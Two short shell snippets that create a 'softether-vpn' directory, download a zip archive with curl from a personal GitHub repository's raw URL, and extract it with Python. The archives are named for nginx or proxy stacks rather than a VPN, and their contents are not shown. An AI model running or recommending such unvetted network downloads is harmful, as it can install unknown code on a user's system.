```
mkdir softether-vpn && \
curl -L -o /tmp/vpn.zip https://raw.githubusercontent.com/AngelGonePro/docker-compose-proxy/refs/heads/main/linode-nginx-stack.zip && \
python3 -c "import zipfile; zipfile.ZipFile('/tmp/vpn.zip').extractall('softether-vpn')" && \
rm /tmp/vpn.zip
```
```
mkdir softether-vpn && \
curl -L -o /tmp/vpn.zip https://raw.githubusercontent.com/AngelGonePro/docker-compose-proxy/refs/heads/main/proxy-nginx.zip && \
python3 -c "import zipfile; zipfile.ZipFile('/tmp/vpn.zip').extractall('softether-vpn')" && \
rm /tmp/vpn.zip
```
